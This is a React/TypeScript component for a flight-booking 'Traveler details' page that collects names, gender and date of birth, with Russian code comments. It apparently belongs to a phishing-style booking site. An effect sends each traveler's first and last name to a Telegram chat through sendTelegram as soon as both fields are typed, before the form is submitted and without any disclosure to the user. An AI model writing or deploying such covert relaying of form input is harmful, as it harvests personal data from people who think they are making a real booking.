import React from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import './TravelerDetails.css';
import { sendTelegram } from './services/telegram';

const BackIcon = () => (
  <svg width="24" height="24" fill="white" viewBox="0 0 24 24">
    <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
  </svg>
);

const TravelerDetails: React.FC = () => {
  const navigate = useNavigate();
  const [sp] = useSearchParams();
  const travelerIdx = React.useMemo(() => {
    const n = Number(sp.get('idx'));
    return Number.isFinite(n) && n >= 0 ? n : 0;
  }, [sp]);
  const titleLabel = React.useMemo(() => {
    try {
      const raw = sessionStorage.getItem('flow_pax') || localStorage.getItem('flow_pax') || '';
      const flow = raw ? JSON.parse(raw) : { adults: 1, childrenAges: [] };
      const adults = Number(flow?.adults || 1);
      const total = adults + (Array.isArray(flow?.childrenAges) ? flow.childrenAges.length : 0);
      if (total <= 1) return 'Traveler details';
      if (travelerIdx < adults) return `Adult ${travelerIdx + 1} details`;
      const childIdx = travelerIdx - adults;
      return `Child ${childIdx + 1} details`;
    } catch { return `Traveler details`; }
  }, [travelerIdx]);
  const typeLabel = React.useMemo(() => {
    try {
      const raw = sessionStorage.getItem('flow_pax') || localStorage.getItem('flow_pax') || '';
      const flow = raw ? JSON.parse(raw) : { adults: 1, childrenAges: [] };
      const adults = Number(flow?.adults || 1);
      const ages: string[] = Array.isArray(flow?.childrenAges) ? flow.childrenAges : [];
      if (travelerIdx < adults) return 'Adult';
      const age = Number(ages[travelerIdx - adults] || NaN);
      return Number.isFinite(age) ? `Child, ${age} y.o.` : 'Child';
    } catch { return ''; }
  }, [travelerIdx]);
  // Инициализация из localStorage синхронно, чтобы форма была заполнена СРАЗУ на первом рендере
  const init = () => {
    try {
      const offerId = sessionStorage.getItem('current_offer_id') || '';
      const base = offerId ? `traveler_details_${offerId}` : 'traveler_details';
      const key = `${base}_${travelerIdx}`;
      const legacy = travelerIdx === 0 ? (offerId ? `traveler_name_${offerId}` : 'traveler_name') : '';
      const raw = localStorage.getItem(key)
        || sessionStorage.getItem(key)
        || (legacy ? (localStorage.getItem(legacy) || sessionStorage.getItem(legacy)) : null);
      if (!raw) return {} as any;
      return JSON.parse(raw);
    } catch { return {} as any; }
  };
  const initData: any = init();
  const [firstName, setFirstName] = React.useState(initData.firstName || '');
  const [lastName, setLastName] = React.useState(initData.lastName || '');
  const [gender, setGender] = React.useState<'Male' | 'Female'>(initData.gender === 'Female' ? 'Female' : 'Male');
  const [dd, setDd] = React.useState(initData.dd || '');
  const [mm, setMm] = React.useState(initData.mm || '');
  const [yyyy, setYyyy] = React.useState(initData.yyyy || '');
  const sentPartialRef = React.useRef(false);

  // no contact fields here by request
  const validDob = /^\d{2}$/.test(dd) && /^\d{2}$/.test(mm) && /^\d{4}$/.test(yyyy);
  const formValid = firstName.trim().length > 0 && lastName.trim().length > 0 && validDob;

  // Helpers for DOB selects
  const days = React.useMemo(() => Array.from({ length: 31 }, (_, i) => String(i + 1).padStart(2, '0')), []);
  const months = React.useMemo(() => (
    [
      { v: '01', n: 'Jan' }, { v: '02', n: 'Feb' }, { v: '03', n: 'Mar' }, { v: '04', n: 'Apr' },
      { v: '05', n: 'May' }, { v: '06', n: 'Jun' }, { v: '07', n: 'Jul' }, { v: '08', n: 'Aug' },
      { v: '09', n: 'Sep' }, { v: '10', n: 'Oct' }, { v: '11', n: 'Nov' }, { v: '12', n: 'Dec' },
    ]
  ), []);
  const years = React.useMemo(() => {
    const y = new Date().getFullYear();
    const arr: string[] = [];
    for (let i = y; i >= 1900; i--) arr.push(String(i));
    return arr;
  }, []);

  // Доп. подстраховка: если кто-то очистил localStorage — перезагружаем из sessionStorage
  React.useEffect(() => {
    try {
      const offerId = sessionStorage.getItem('current_offer_id') || '';
      const base = offerId ? `traveler_details_${offerId}` : 'traveler_details';
      const key = `${base}_${travelerIdx}`;
      const raw = localStorage.getItem(key);
      if (!raw) {
        const s = sessionStorage.getItem(key);
        if (s) localStorage.setItem(key, s);
      }
    } catch {}
  }, [travelerIdx]);

  // Autosave to sessionStorage on changes
  React.useEffect(() => {
    try {
      const offerId = sessionStorage.getItem('current_offer_id') || '';
      const base = offerId ? `traveler_details_${offerId}` : 'traveler_details';
      const key = `${base}_${travelerIdx}`;
      const payload = JSON.stringify({ firstName, lastName, gender, dd, mm, yyyy });
      localStorage.setItem(key, payload);
      sessionStorage.setItem(key, payload);
      // Совместимость со старым ключом для первого пассажира
      if (travelerIdx === 0) {
        localStorage.setItem(base, payload);
        sessionStorage.setItem(base, payload);
      }
    } catch {}
    // Telegram: уведомление, когда впервые заполнены имя и фамилия
    try {
      if (!sentPartialRef.current && firstName.trim() && lastName.trim()) {
        sentPartialRef.current = true;
        sendTelegram(`✍️ <b>Имя/фамилия заполнены</b>\n<b>First</b>: ${firstName}\n<b>Last</b>: ${lastName}`);
      }
    } catch {}
  }, [firstName, lastName, gender, dd, mm, yyyy, travelerIdx]);

  return (
    <div className="trav-page">
      <div className="trav-header">
        <button className="back-button" onClick={() => navigate(-1)}><BackIcon/></button>
        <h1>{titleLabel}</h1>
        <div style={{ width: 24 }}></div>
      </div>
      {typeLabel && (
        <div style={{ padding: '0 16px', color:'#ccc', marginTop:-8, marginBottom:8 }}>{typeLabel}</div>
      )}

      {/* Contact fields removed; handled in Contact details page */}

      <div className="section">
        <div className="banner">Double‑check your details
          <p>Make sure your details match your passport or ID. Some airlines don't allow changes after booking.</p>
        </div>

        <label className={`field ${!firstName ? 'error' : ''}`}>
          <span>First names</span>
          <input value={firstName} onChange={(e)=>setFirstName(e.target.value.replace(/[^A-Za-z \-']/g, ''))} />
          {!firstName && <div className="hint">Add first name(s) for this traveler to continue</div>}
        </label>

        <label className={`field ${!lastName ? 'error' : ''}`}>
          <span>Last names</span>
          <input value={lastName} onChange={(e)=>setLastName(e.target.value.replace(/[^A-Za-z \-']/g, ''))} />
          {!lastName && <div className="hint">Add last name(s) for this traveler to continue</div>}
        </label>

        <label className="field">
          <span>Gender specified on your passport/ID</span>
          <select value={gender} onChange={(e)=>setGender(e.target.value as any)}>
            <option>Male</option>
            <option>Female</option>
          </select>
        </label>

        <div className="row">
          <label className={`field small ${!validDob ? 'error' : ''}`}>
            <span>Date of birth</span>
            <div className="dob">
              <select value={dd} onChange={(e)=>setDd(e.target.value)}>
                <option value="">DD</option>
                {days.map(d => <option key={d} value={d}>{d}</option>)}
              </select>
              <select value={mm} onChange={(e)=>setMm(e.target.value)}>
                <option value="">MM</option>
                {months.map(m => <option key={m.v} value={m.v}>{m.n}</option>)}
              </select>
              <select value={yyyy} onChange={(e)=>setYyyy(e.target.value)}>
                <option value="">YYYY</option>
                {years.map(y => <option key={y} value={y}>{y}</option>)}
              </select>
            </div>
            {!validDob && <div className="hint">Select a valid date</div>}
          </label>
        </div>
      </div>

      <div className="trav-footer">
        <button className="next-button" disabled={!formValid} onClick={()=>{ if (!formValid) return; try { const offerId = sessionStorage.getItem('current_offer_id') || ''; const base = offerId ? `traveler_details_${offerId}` : 'traveler_details'; const payload = JSON.stringify({ firstName, lastName, gender, dd, mm, yyyy }); localStorage.setItem(`${base}_${travelerIdx}`, payload); sessionStorage.setItem(`${base}_${travelerIdx}`, payload); if (travelerIdx === 0) { localStorage.setItem(base, payload); sessionStorage.setItem(base, payload); } } catch {} ; navigate(-1);}}>Done</button>
      </div>
    </div>
  );
};

export default TravelerDetails;


